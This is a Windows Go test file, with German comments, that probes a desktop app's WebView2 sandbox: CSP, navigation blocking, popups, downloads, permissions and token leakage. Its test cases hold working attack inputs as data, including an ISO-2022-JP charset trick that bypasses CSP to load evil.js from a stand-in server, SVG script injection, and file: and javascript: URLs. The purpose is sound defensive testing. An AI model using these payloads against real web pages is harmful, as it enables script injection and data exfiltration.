//go:build windows

package fensterio

// Native Sonden gegen das echte WebView2 (SEC K6b-2). Opt-in: JNPT_NATIVE_WEBVIEW_PROBE=1, in einer
// interaktiven Sitzung (Fenster brauchen einen Desktop), WebView2-Runtime installiert. Nie auf dem
// Entwicklerrechner. Das Test-Binary braucht auf der Test-VM kein Go:
//
//	go test -c -o fensterio.test.exe ./internal/fensterio        (auf dem Build-Rechner)
//	set JNPT_NATIVE_WEBVIEW_PROBE=1
//	fensterio.test.exe -test.run TestWindowsWebView -test.v -test.timeout 10m   (als testnutzer, PATH ohne "jnpt")
//
// Eine Sonde je Ereignis; PASS ohne SKIP ist der Beleg. Jede Sonde hat eine Kontrolle, die zeigt, dass sie
// den Angriff überhaupt sehen kann (sonst wäre ein Grün blind).

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"testing"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/januaport/januaport-plugins/desktop-runner/internal/edge"
	"github.com/januaport/januaport-plugins/desktop-runner/internal/fenster"
)

var (
	pPeek     = user32.NewProc("PeekMessageW")
	pTransl   = user32.NewProc("TranslateMessage")
	pDispatch = user32.NewProc("DispatchMessageW")
)

type probeMsg struct {
	Window         uintptr
	Message        uint32
	WParam, LParam uintptr
	Time           uint32
	X, Y           int32
	Private        uint32
}

// probeGateway zeichnet die Werkzeugaufrufe der Seite auf: Die Seite meldet ihre Beobachtungen als
// Werkzeug "report" an die Brücke; so kommen sie durch genau den Weg, den sie später im Betrieb nehmen.
type probeGateway struct {
	mu     sync.Mutex
	events []string
}

func (g *probeGateway) Werkzeuge(context.Context) (json.RawMessage, error) {
	return json.RawMessage(`{"tools":[]}`), nil
}
func (g *probeGateway) Werkzeug(_ context.Context, name string, args json.RawMessage) (json.RawMessage, error) {
	g.mu.Lock()
	g.events = append(g.events, name+" "+string(args))
	g.mu.Unlock()
	return json.RawMessage(`{"ok":true}`), nil
}
func (g *probeGateway) reset() {
	g.mu.Lock()
	g.events = nil
	g.mu.Unlock()
}

func (g *probeGateway) snapshot() []string {
	g.mu.Lock()
	defer g.mu.Unlock()
	return append([]string(nil), g.events...)
}

func (g *probeGateway) has(sub string) bool {
	g.mu.Lock()
	defer g.mu.Unlock()
	for _, e := range g.events {
		if strings.Contains(e, sub) {
			return true
		}
	}
	return false
}

type probeLokal struct{}

func (probeLokal) Status(context.Context) (fenster.Status, error) {
	return fenster.Status{Zustand: "arbeitet", Netz: true}, nil
}
func (probeLokal) Anhalten(context.Context) error { return nil }

// probeBed ist ein Fremdserver (loopback), der jeden Abruf zählt: Ein Treffer heißt, dass etwas ausgeleitet wurde.
type probeBed struct {
	t     *testing.T
	srv   *httptest.Server
	hits  atomic.Int32
	paths sync.Mutex
	seen  []string
	gw    *probeGateway

	closers []func() // laufen auf dem Thread der Sonde, bevor er endet (Fenster gehören ihrem Thread)

	mu        sync.Mutex
	snapshots []func() []string // Spuren aller geöffneten Fenster, für die Ausgabe im Fehlerfall
}

// dump gibt im Fehlerfall alles aus, was die Sonde gesehen hat: die Spur jedes Fensters (native Ereignisse,
// Urteile mit Grund, NavigationCompleted mit Status, Antworten als ok oder fester Code) und die Meldungen der
// Seite an die Brücke. Texte der Seite laufen durch DiagText (gequotet, begrenzt, Träger maskiert).
func (b *probeBed) dump(t *testing.T) {
	t.Helper()
	b.mu.Lock()
	snaps := append([]func() []string(nil), b.snapshots...)
	b.mu.Unlock()
	for i, snap := range snaps {
		for _, line := range snap() {
			t.Logf("Spur %d: %s", i, line)
		}
	}
	for _, e := range b.gw.snapshot() {
		t.Logf("Seite meldet: %s", fenster.DiagText(e))
	}
	t.Logf("Fremdserver: %d Treffer %v", b.hits.Load(), b.seenPaths())
}

func newProbeBed(t *testing.T) *probeBed {
	if os.Getenv("JNPT_NATIVE_WEBVIEW_PROBE") != "1" {
		t.Skip("opt-in: JNPT_NATIVE_WEBVIEW_PROBE=1 in einer interaktiven Sitzung mit WebView2-Runtime")
	}
	if strings.Contains(strings.ToLower(os.Getenv("PATH")), "jnpt") {
		t.Fatal("PATH trägt jnpt: Die Umgebung der Sonde muss sauber sein")
	}
	b := &probeBed{t: t, gw: &probeGateway{}}
	b.srv = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		b.hits.Add(1)
		b.paths.Lock()
		b.seen = append(b.seen, r.URL.Path)
		b.paths.Unlock()
		w.Header().Set("Content-Type", "text/javascript")
		if strings.HasSuffix(r.URL.Path, ".zip") {
			w.Header().Set("Content-Disposition", "attachment")
		}
		fmt.Fprint(w, "")
	}))
	t.Cleanup(b.srv.Close)
	return b
}

func (b *probeBed) seenPaths() []string {
	b.paths.Lock()
	defer b.paths.Unlock()
	return append([]string(nil), b.seen...)
}

// openProbe legt Dateien in einen App-Ordner und öffnet ein echtes Fenster. Die Dateien gehen NICHT durch
// den Ladeprüfer (er lehnt die Angriffsdateien absichtlich ab); die Sonde belegt, was der Browser mit ihnen
// täte, und dass die native Sperre greift.
func (b *probeBed) openProbe(app string, files map[string]string, mutate func(*SurfaceConfig)) (*Surface, *Opened, *[]string) {
	t := b.t
	b.gw.reset() // Ereignisse früherer Unterfälle dürfen nie als Beleg dieses Falls zählen
	dir := t.TempDir()
	for name, body := range files {
		p := filepath.Join(dir, filepath.FromSlash(name))
		if err := os.MkdirAll(filepath.Dir(p), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(p, []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	host, err := NewHost(HostConfig{App: app, Gateway: b.gw, Lokal: probeLokal{}, Wake: func() {}})
	if err != nil {
		t.Fatal(err)
	}
	// Der Browser hält Dateien im Datenordner noch kurz nach dem Schließen offen; t.TempDir würde daran scheitern.
	dataRoot, err := os.MkdirTemp("", "jnpt-probe-")
	if err != nil {
		t.Fatal(err)
	}
	b.closers = append(b.closers, func() { removeWhenFree(t, dataRoot) })
	o := &Opened{Name: app, Dir: dir, UserDataDir: filepath.Join(dataRoot, "webview", app), TestDevice: true, Host: host}
	var trace []string
	var mu sync.Mutex
	b.mu.Lock()
	b.snapshots = append(b.snapshots, func() []string {
		mu.Lock()
		defer mu.Unlock()
		return append([]string(nil), trace...)
	})
	b.mu.Unlock()
	cfg := SurfaceConfig{
		OnLink: func(l Link) { mu.Lock(); trace = append(trace, "link "+l.Host); mu.Unlock() },
		Probe:  func(ev, detail string) { mu.Lock(); trace = append(trace, ev+" "+detail); mu.Unlock() },
	}
	if mutate != nil {
		mutate(&cfg)
	}
	s, err := NewSurface(o, cfg)
	if err != nil {
		t.Fatalf("NewSurface: %v", err)
	}
	b.closers = append(b.closers, s.Close)
	return s, o, &trace
}

// pump läuft auf dem UI-Thread des Tests: Nachrichten verteilen, Antworten an die Seite geben, bis cond oder Frist.
func pump(t *testing.T, s *Surface, d time.Duration, cond func() bool) bool {
	t.Helper()
	deadline := time.Now().Add(d)
	var m probeMsg
	for time.Now().Before(deadline) {
		for {
			r, _, _ := pPeek.Call(uintptr(unsafe.Pointer(&m)), 0, 0, 0, 1)
			if r == 0 {
				break
			}
			pTransl.Call(uintptr(unsafe.Pointer(&m)))
			pDispatch.Call(uintptr(unsafe.Pointer(&m)))
		}
		if s != nil {
			s.Pump()
		}
		if cond != nil && cond() {
			return true
		}
		time.Sleep(15 * time.Millisecond)
	}
	return cond == nil
}

// probeFrist ist die Frist je Sonde (je Unterfall): Ein Hänger kostet genau eine Sonde, nicht den Lauf.
const probeFrist = 90 * time.Second

// run führt die Sonde auf einem eigenen, festen Thread mit COM-STA aus (genau wie das Bedienfeld) und gibt
// ihr eine eigene Frist. Der Thread bleibt gesperrt und endet mit der Goroutine, damit nichts von COM oder
// Fenstern in den Pool zurückläuft. Hängt die Sonde, schlägt nur dieser Test fehl.
func (b *probeBed) run(t *testing.T, frist time.Duration, body func(t *testing.T)) {
	t.Helper()
	done := make(chan struct{})
	go func() {
		defer close(done)
		runtime.LockOSThread()
		leave, err := EnterUI()
		if err != nil {
			t.Errorf("EnterUI: %v", err)
			return
		}
		defer leave()
		defer func() {
			if t.Failed() {
				b.dump(t)
			}
			for i := len(b.closers) - 1; i >= 0; i-- {
				b.closers[i]()
			}
			b.closers = nil
		}()
		body(t)
	}()
	select {
	case <-done:
	case <-time.After(frist):
		b.dump(t)
		t.Fatalf("Sonde hängt: keine Rückmeldung innerhalb von %v", frist)
	}
}

func probePage(head, body string) string {
	return "<!doctype html><html><head><meta charset=\"utf-8\">" + fenster.CSPMeta() + head + "</head><body>" + body + "</body></html>"
}

const probeJS = `
function send(name, data) { window.chrome.webview.postMessage(JSON.stringify({id: String(Math.random()).slice(2), befehl: "werkzeug", args: {name: name, arguments: data}})); }
window.send = send;
send("js_ok", {seite: location.pathname});
`

// Kontrolle für alle: die Seite lädt, Skript läuft, die Brücke antwortet (auch mit Doppelbindestrich im Host).
func TestWindowsWebViewSeiteBrueckeUndHostname(t *testing.T) {
	b := newProbeBed(t)
	for _, app := range []string{"probe", "_probe_"} { // _ wird zu - : app--probe--pc.jnpt.invalid
		t.Run(app, func(t *testing.T) {
			b.t = t
			b.run(t, probeFrist, func(t *testing.T) {
				s, _, _ := b.openProbe(app, map[string]string{
					"index.html": probePage(`<script src="probe.js"></script>`, `<script src="start.js"></script>`),
					"probe.js":   probeJS,
					"start.js":   `send("geladen", {pfad: location.pathname, host: location.host, protokoll: location.protocol});`,
				}, nil)
				if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("geladen") }) {
					t.Fatal("Seite nicht geladen oder Brücke antwortet nicht (Hostname mit Doppelbindestrich?)")
				}
				host, _ := fenster.AppHost(app)
				if !b.gw.has(host) || !b.gw.has(`"pfad":"/index.html"`) || !b.gw.has("https:") {
					t.Fatalf("Seite lief auf falschem Host: %v", b.gw.events)
				}
			})
		})
	}
}

// F1/F4 am echten Browser: Mit dem Präfix des Läufers (Zeichensatz, dann CSP) hält die CSP; ohne Zeichensatz-Meta
// verschluckt der ISO-2022-JP-Trick sie (Kontrolle: Die Sonde sieht den Angriff).
func TestWindowsWebViewCSPUndZeichensatztrick(t *testing.T) {
	b := newProbeBed(t)
	esc := "\x1b"
	evil := `<script src="` + b.srv.URL + `/evil.js"></script>`
	fetchProbe := `<script src="fetch.js"></script>`
	fetchJS := `fetch("` + b.srv.URL + `/fetch").then(function(){send("fetch", {ok: true})}).catch(function(){send("fetch", {ok: false})});`
	cases := map[string]struct {
		html      string
		wantLeak  bool
		wantLabel string
	}{
		// SEC F4, Muster 1 und 2, Gegenprobe: erst Zeichensatz, dann CSP, dahinter die Falle.
		"f4MitPraefix":          {"<!doctype html><!--" + esc + "$B--><head>" + fenster.HeadPrefix() + esc + "(B-->" + evil + `<meta charset=iso-2022-jp>` + fetchProbe, false, "f4a"},
		"f4HttpEquivMitPraefix": {"<!doctype html><!--" + esc + "$B--><head>" + fenster.HeadPrefix() + esc + "(B-->" + evil + `<meta http-equiv="content-type" content="text/html; charset=iso-2022-jp">` + fetchProbe, false, "f4b"},
		// Kontrollen: ohne Zeichensatz-Meta (nur CSP) trägt der Trick, fremdes Skript läuft.
		"f4KontrolleOhneZeichensatz": {"<!doctype html><!--" + esc + "$B--><head>" + fenster.CSPMeta() + esc + "(B-->" + evil + `<meta charset=iso-2022-jp>` + fetchProbe, true, "f4k"},
		// SEC F1: Text vor <head> schiebt die CSP in den Body, der Browser ignoriert sie (Kontrolle).
		"f1KontrolleTextVorHead":   {"x<meta http-equiv=\"Content-Security-Policy\" content=\"" + fenster.CSP + "\">" + evil + fetchProbe, true, "f1k"},
		"f1KontrolleEndTagVorHead": {"</br><meta http-equiv=\"Content-Security-Policy\" content=\"" + fenster.CSP + "\">" + evil + fetchProbe, true, "f1k2"},
		// Der Präfix des Läufers hält auch bei langem Kommentar davor (Präfix hinter 1.024 Byte).
		"langerKommentarMitPraefix": {"<!doctype html><!--" + strings.Repeat("x", 2000) + "--><head>" + fenster.HeadPrefix() + evil + fetchProbe, false, "lang"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			b.t = t
			b.run(t, probeFrist, func(t *testing.T) {
				hitsBefore := b.hits.Load()
				s, _, _ := b.openProbe("probe", map[string]string{
					"index.html": tc.html,
					"probe.js":   probeJS,
					"fetch.js":   probeJS + fetchJS,
				}, nil)
				// probe.js muss vor fetch.js laufen: Die Seiten oben laden nur fetch.js; es lädt probe.js selbst.
				pump(t, s, 8*time.Second, func() bool { return b.gw.has("fetch") })
				leaked := b.hits.Load() > hitsBefore
				switch {
				case tc.wantLeak && !leaked:
					t.Fatalf("%s: Kontrolle blind. Die Sonde sieht den Angriff nicht; ein Grün bei den anderen Fällen wäre wertlos (Treffer: %v)", tc.wantLabel, b.seenPaths())
				case !tc.wantLeak && leaked:
					t.Fatalf("%s: CSP hielt nicht, der Fremdserver bekam %v", tc.wantLabel, b.seenPaths())
				}
			})
		})
	}
}

// F2 und NavigationStarting: Ein Link auf eine Nicht-HTML-Datei der eigenen App, auf einen fremden Host, ein
// meta refresh und location werden vor der Anfrage abgebrochen; die Seite bleibt.
func TestWindowsWebViewNavigationStarting(t *testing.T) {
	b := newProbeBed(t)
	foreign := b.srv.URL + "/ziel.html"
	svg := `<svg xmlns="http://www.w3.org/2000/svg"><script src="x" href="` + b.srv.URL + `/evil.js"/></svg>`
	for name, body := range map[string]string{
		"svgDerEigenenApp": `<a id="l" href="a.svg">x</a><script src="nav.js"></script>`,
		"fremderHost":      `<a id="l" href="` + foreign + `">x</a><script src="nav.js"></script>`,
		"locationFremd":    `<script src="loc.js"></script><script src="nav.js"></script>`,
		"metaRefresh":      `<meta http-equiv="refresh" content="0;url=` + foreign + `"><script src="nav.js"></script>`,
		"dataUrl":          `<a id="l" href="data:text/html,<script>1</script>">x</a><script src="nav.js"></script>`,
		"fileUrl":          `<a id="l" href="file:///C:/Windows/win.ini">x</a><script src="nav.js"></script>`,
		"javascriptUrl":    `<a id="l" href="javascript:send('js',{})">x</a><script src="nav.js"></script>`,
	} {
		t.Run(name, func(t *testing.T) {
			b.t = t
			b.run(t, probeFrist, func(t *testing.T) {
				hitsBefore := b.hits.Load()
				navJS := `var l = document.getElementById("l"); if (l) { l.click(); } setTimeout(function(){ send("nav", {pfad: location.pathname}); }, 1500);`
				s, _, trace := b.openProbe("probe", map[string]string{
					"index.html": probePage(`<script src="probe.js"></script>`, body),
					"probe.js":   probeJS,
					"nav.js":     navJS,
					"loc.js":     `location.href = "` + foreign + `";`,
					"a.svg":      svg,
				}, nil)
				if !pump(t, s, 20*time.Second, func() bool { return b.gw.has(`"pfad":"/index.html"`) }) {
					t.Fatalf("Seite nicht mehr auf /index.html oder nie geladen; Ereignisse: %v", *trace)
				}
				if b.hits.Load() != hitsBefore {
					t.Fatalf("Abruf beim Fremdserver: %v", b.seenPaths())
				}
			})
		})
	}
}

// Kontrolle zu NavigationStarting: eigene HTML-Unterseite bleibt navigierbar.
func TestWindowsWebViewEigeneSeiteNavigierbar(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		s, _, _ := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<a id="l" href="zwei.html">x</a><script src="klick.js"></script>`),
			"zwei.html":  probePage(`<script src="probe.js"></script>`, `<script src="zwei.js"></script>`),
			"klick.js":   `document.getElementById("l").click();`,
			"zwei.js":    `send("zwei", {pfad: location.pathname});`,
			"probe.js":   probeJS,
		}, nil)
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has(`"pfad":"/zwei.html"`) }) {
			t.Fatal("eigene .html-Unterseite lässt sich nicht öffnen")
		}
	})
}

// NewWindowRequested: window.open und target=_blank erzeugen nie ein Fenster; ein https-Link wird als
// Dialogvorschlag gemeldet, ein http-Ziel verschwindet.
func TestWindowsWebViewNewWindowRequested(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		hitsBefore := b.hits.Load()
		var links []string
		var mu sync.Mutex
		s, _, trace := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<a id="l" target="_blank" href="https://example.org/ziel">x</a><script src="win.js"></script>`),
			"probe.js":   probeJS,
			"win.js": `
var w1 = window.open("https://example.org/popup", "_blank");
var w2 = window.open("` + b.srv.URL + `/popup", "_blank");
document.getElementById("l").click();
setTimeout(function(){ send("fenster", {w1: w1 === null, w2: w2 === null}); }, 1500);`,
		}, func(c *SurfaceConfig) {
			c.OnLink = func(l Link) { mu.Lock(); links = append(links, l.Host+"|"+l.URL); mu.Unlock() }
		})
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("fenster") }) {
			t.Fatal("Seite meldet nicht")
		}
		mu.Lock()
		defer mu.Unlock()
		if b.hits.Load() != hitsBefore {
			t.Fatalf("Abruf beim Fremdserver: %v", b.seenPaths())
		}
		if len(links) == 0 || !strings.HasPrefix(links[0], "example.org|https://example.org/") {
			t.Fatalf("kein Dialogvorschlag für den https-Link: %v, Ereignisse %v", links, *trace)
		}
		if topLevelWindows(t) != 1 {
			t.Fatalf("zusätzliches Fenster entstanden (%d Top-Level-Fenster der Klasse)", topLevelWindows(t))
		}
	})
}

// DownloadStarting: Ein Download aus der eigenen App wird abgebrochen, es entsteht keine Datei.
func TestWindowsWebViewDownloadStarting(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		downloads := filepath.Join(t.TempDir(), "dl")
		_ = os.MkdirAll(downloads, 0o700)
		s, _, trace := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<a id="l" download="d.txt" href="daten.txt">x</a><script src="dl.js"></script>`),
			"dl.js":      `document.getElementById("l").click(); setTimeout(function(){send("dl", {});}, 1500);`,
			"probe.js":   probeJS,
			"daten.txt":  "geheim",
		}, nil)
		seen := false
		pump(t, s, 20*time.Second, func() bool {
			for _, e := range *trace {
				if strings.HasPrefix(e, "DownloadStarting") {
					seen = true
				}
			}
			return seen && b.gw.has("dl")
		})
		if !seen {
			t.Fatalf("DownloadStarting nie gemeldet (Kontrolle: Der Auslöser ist blind): %v", *trace)
		}
	})
}

// WebMessageReceived mit Source: Die Brücke bekommt die echte Quell-URL, nicht eine Annahme.
func TestWindowsWebViewNachrichtQuelle(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		s, _, trace := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<script src="q.js"></script>`),
			"q.js":       `send("q", {});`,
			"probe.js":   probeJS,
		}, nil)
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("q ") }) {
			t.Fatal("Nachricht kam nicht an")
		}
		want := "WebMessageReceived " + fenster.StartURL("probe")
		found := false
		for _, e := range *trace {
			if e == want {
				found = true
			}
		}
		if !found {
			t.Fatalf("Quelle nicht als %q gemeldet: %v", want, *trace)
		}
	})
}

// PermissionRequested: Standard Deny.
func TestWindowsWebViewBerechtigungenAbgelehnt(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		s, _, _ := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<script src="rechte.js"></script>`),
			"rechte.js": `
navigator.geolocation.getCurrentPosition(function(){ send("geo", {code: 0}); }, function(e){ send("geo", {code: e.code}); });
navigator.mediaDevices.getUserMedia({audio: true}).then(function(){ send("mikro", {ok: true}); }).catch(function(e){ send("mikro", {ok: false, name: e.name}); });
`,
			"probe.js": probeJS,
		}, nil)
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("geo ") && b.gw.has("mikro ") }) {
			t.Fatal("Berechtigungsabfragen blieben ohne Antwort")
		}
		if !b.gw.has(`"code":1`) || b.gw.has(`"ok":true`) {
			t.Fatalf("Berechtigung nicht abgelehnt: %v", b.gw.events)
		}
	})
}

// ProcessFailed (B1): Stirbt der Browserprozess, schließt das Fenster, der Host ist zu und der Test-Prozess lebt.
func TestWindowsWebViewProzessabsturz(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		closed := false
		s, o, _ := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<script src="lebt.js"></script>`),
			"lebt.js":    `send("lebt", {});`,
			"probe.js":   probeJS,
		}, func(c *SurfaceConfig) { c.OnClosed = func() { closed = true } })
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("lebt") }) {
			t.Fatal("Seite lädt nicht")
		}
		killed := 0
		for _, p := range webviewProcesses(t) {
			h, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, p.pid)
			if err == nil {
				_ = windows.TerminateProcess(h, 1)
				_ = windows.CloseHandle(h)
				killed++
			}
		}
		if killed == 0 {
			t.Fatal("kein msedgewebview2-Prozess unter dem Test gefunden (Kontrolle blind)")
		}
		if !pump(t, nil, 20*time.Second, func() bool { return closed }) {
			t.Fatal("Fenster blieb nach dem Absturz stehen")
		}
		if !o.Host.Closed() {
			t.Fatal("Host nach Absturz nicht geschlossen")
		}
	})
}

// Prozessbaum (SEC (a), (b)): Weder Umgebung noch Kommandozeile irgendeines msedgewebview2-Prozesses unter
// dem Prozess, der das Token hält, tragen jnpt oder einen Träger; das Benutzerdatenverzeichnis auch nicht.
func TestWindowsWebViewProzessbaumOhneTraeger(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		const fakeToken = "jn" + "ptpc_" + "SONDENWERT0123456789"
		t.Setenv("JNPT_SONDE_TRAEGER", "") // Kontrolle gegen die Namensprüfung unten: leer, nicht gesetzt
		os.Unsetenv("JNPT_SONDE_TRAEGER")
		s, o, _ := b.openProbe("probe", map[string]string{
			"index.html": probePage(`<script src="probe.js"></script>`, `<script src="baum.js"></script>`),
			"baum.js":    `send("baum", {});`,
			"probe.js":   probeJS,
		}, nil)
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("baum") }) {
			t.Fatal("Seite lädt nicht")
		}
		procs := webviewProcesses(t)
		if len(procs) == 0 {
			t.Fatal("kein msedgewebview2-Prozess gefunden: Die Sonde wäre blind")
		}
		for _, p := range procs {
			text := strings.ToLower(p.cmdline + "\n" + p.env)
			for _, bad := range []string{"jnpt", strings.ToLower(fakeToken), "bearer"} {
				if strings.Contains(text, bad) {
					t.Errorf("Prozess %d (%s) trägt %q", p.pid, p.name, bad)
				}
			}
		}
		if strings.Contains(strings.ToLower(o.UserDataDir), "jnpt") {
			t.Fatal("Benutzerdatenverzeichnis trägt jnpt im Pfad")
		}
		// Kein Pipe-Handle (SEC (b)): Keine vererbbaren Handles; hier genügt, dass der Name nirgends auftaucht.
		for _, p := range procs {
			if strings.Contains(strings.ToLower(p.cmdline+p.env), "bedienfeld") {
				t.Errorf("Prozess %d kennt den Pipe-Namen", p.pid)
			}
		}
	})
}

// ClearBrowsingData (A5): löscht Cookies/Speicher des Profils; die Antwort kommt im UI-Thread.
func TestWindowsWebViewClearBrowsingData(t *testing.T) {
	b := newProbeBed(t)
	b.run(t, probeFrist, func(t *testing.T) {
		s, _, _ := b.openProbe("probe", map[string]string{
			"index.html":  probePage(`<script src="probe.js"></script>`, `<script src="speicher.js"></script>`),
			"speicher.js": `localStorage.setItem("k", "v"); send("gesetzt", {v: localStorage.getItem("k")});`,
			"probe.js":    probeJS,
		}, nil)
		if !pump(t, s, 20*time.Second, func() bool { return b.gw.has("gesetzt") }) {
			t.Fatal("Seite lädt nicht")
		}
		ok := make(chan bool, 1)
		if err := s.ClearBrowsingData(func(good bool) { ok <- good }); err != nil {
			t.Fatalf("ClearBrowsingData: %v", err)
		}
		var good bool
		if !pump(t, s, 20*time.Second, func() bool {
			select {
			case good = <-ok:
				return true
			default:
				return false
			}
		}) || !good {
			t.Fatal("ClearBrowsingData meldet keinen Erfolg")
		}
	})
}

// --- Hilfen: Fenster zählen, msedgewebview2-Prozesse unter dem Test samt Umgebung und Kommandozeile

var (
	pEnumWindows = user32.NewProc("EnumWindows")
	pClassName   = user32.NewProc("GetClassNameW")
	pWindowPID   = user32.NewProc("GetWindowThreadProcessId")
)

func topLevelWindows(t *testing.T) int {
	t.Helper()
	n := 0
	cb := syscall.NewCallback(func(hwnd, _ uintptr) uintptr {
		var buf [64]uint16
		pClassName.Call(hwnd, uintptr(unsafe.Pointer(&buf[0])), 64)
		var pid uint32
		pWindowPID.Call(hwnd, uintptr(unsafe.Pointer(&pid)))
		if pid == windows.GetCurrentProcessId() && windows.UTF16ToString(buf[:]) == className {
			n++
		}
		return 1
	})
	pEnumWindows.Call(cb, 0)
	return n
}

type procInfo struct {
	pid     uint32
	name    string
	cmdline string
	env     string
}

// webviewProcesses liefert alle msedgewebview2.exe-Nachfahren dieses Prozesses mit Kommandozeile und Umgebung (PEB).
func webviewProcesses(t *testing.T) []procInfo {
	t.Helper()
	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		t.Fatal(err)
	}
	defer windows.CloseHandle(snap)
	parent := map[uint32]uint32{}
	names := map[uint32]string{}
	var e windows.ProcessEntry32
	e.Size = uint32(unsafe.Sizeof(e))
	for err = windows.Process32First(snap, &e); err == nil; err = windows.Process32Next(snap, &e) {
		parent[e.ProcessID] = e.ParentProcessID
		names[e.ProcessID] = windows.UTF16ToString(e.ExeFile[:])
	}
	self := windows.GetCurrentProcessId()
	var out []procInfo
	for pid, name := range names {
		if !strings.EqualFold(name, "msedgewebview2.exe") || !descends(parent, pid, self) {
			continue
		}
		cmd, env := readPEB(t, pid)
		out = append(out, procInfo{pid, name, cmd, env})
	}
	return out
}

func descends(parent map[uint32]uint32, pid, root uint32) bool {
	for i := 0; i < 16 && pid != 0; i++ {
		pid = parent[pid]
		if pid == root {
			return true
		}
	}
	return false
}

func readPEB(t *testing.T, pid uint32) (cmdline, env string) {
	t.Helper()
	h, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, pid)
	if err != nil {
		t.Fatalf("OpenProcess %d: %v", pid, err)
	}
	defer windows.CloseHandle(h)
	var info windows.PROCESS_BASIC_INFORMATION
	if err = windows.NtQueryInformationProcess(h, 0, unsafe.Pointer(&info), uint32(unsafe.Sizeof(info)), nil); err != nil {
		t.Fatal(err)
	}
	read := func(addr uintptr, dst unsafe.Pointer, size uintptr) {
		if err := windows.ReadProcessMemory(h, addr, (*byte)(dst), size, nil); err != nil {
			t.Fatalf("ReadProcessMemory %d: %v", pid, err)
		}
	}
	var peb windows.PEB
	read(uintptr(unsafe.Pointer(info.PebBaseAddress)), unsafe.Pointer(&peb), unsafe.Sizeof(peb))
	var params windows.RTL_USER_PROCESS_PARAMETERS
	read(uintptr(unsafe.Pointer(peb.ProcessParameters)), unsafe.Pointer(&params), unsafe.Sizeof(params))
	cmd := make([]uint16, int(params.CommandLine.Length)/2)
	if len(cmd) > 0 {
		read(uintptr(unsafe.Pointer(params.CommandLine.Buffer)), unsafe.Pointer(&cmd[0]), uintptr(len(cmd)*2))
	}
	var envText []rune
	if params.EnvironmentSize > 0 && params.EnvironmentSize < 1<<20 {
		raw := make([]uint16, params.EnvironmentSize/2)
		read(uintptr(params.Environment), unsafe.Pointer(&raw[0]), params.EnvironmentSize)
		for _, c := range raw {
			envText = append(envText, rune(c))
		}
	}
	return windows.UTF16ToString(cmd), string(envText)
}

// VM-Befund: Ohne COM auf dem Thread scheitert die Umgebung mit „CoInitialize wurde nicht aufgerufen“. Der Adapter
// prüft den Thread vor dem Start und meldet den festen Fehler; kein Hänger, kein Fenster, kein Prozessende.
func TestWindowsWebViewOhneCOMOeffnetNicht(t *testing.T) {
	b := newProbeBed(t)
	done := make(chan error, 1)
	go func() {
		runtime.LockOSThread() // bewusst ohne EnterUI
		done <- b.openOhneCOM(false)
	}()
	select {
	case err := <-done:
		if !errors.Is(err, ErrWebView) {
			t.Fatalf("erwartet den festen Fehler, bekam %v", err)
		}
	case <-time.After(probeFrist):
		t.Fatal("Sonde hängt")
	}
	if n := openSurfaces(); n != 0 {
		t.Fatalf("%d Fenster nach dem Fehlstart", n)
	}
}

// Erzwungener Fehlstart: Die Prüfung des Threads ist abgeschaltet, die Umgebung scheitert wirklich in WebView2
// (so wie auf der VM). NewSurface muss in kurzer Zeit mit dem festen Fehler enden, ein Fenster bleibt zu, und
// dieselbe Oberfläche (derselbe Thread) bleibt danach bedienbar: Nachrichten werden weiter verteilt.
func TestWindowsWebViewFehlstartHaengtNicht(t *testing.T) {
	b := newProbeBed(t)
	type result struct {
		err     error
		elapsed time.Duration
		pumped  bool
	}
	done := make(chan result, 1)
	go func() {
		runtime.LockOSThread()
		start := time.Now()
		err := b.openOhneCOM(true)
		elapsed := time.Since(start)
		pumped := pump(t, nil, 200*time.Millisecond, nil) // läuft zurück, ohne zu blockieren
		done <- result{err, elapsed, pumped}
	}()
	select {
	case r := <-done:
		if !errors.Is(r.err, ErrWebView) {
			t.Fatalf("erwartet den festen Fehler, bekam %v", r.err)
		}
		if r.elapsed > startFrist+5*time.Second {
			t.Fatalf("Fehlstart dauerte %v (Grenze %v)", r.elapsed, startFrist)
		}
		if !r.pumped {
			t.Fatal("Nachrichtenverteilung nach dem Fehlstart blockiert")
		}
	case <-time.After(probeFrist):
		t.Fatal("Sonde hängt: NewSurface kehrt bei scheiternder Umgebung nicht zurück (Halt wäre blockiert)")
	}
	if n := openSurfaces(); n != 0 {
		t.Fatalf("%d Fenster nach dem Fehlstart", n)
	}
}

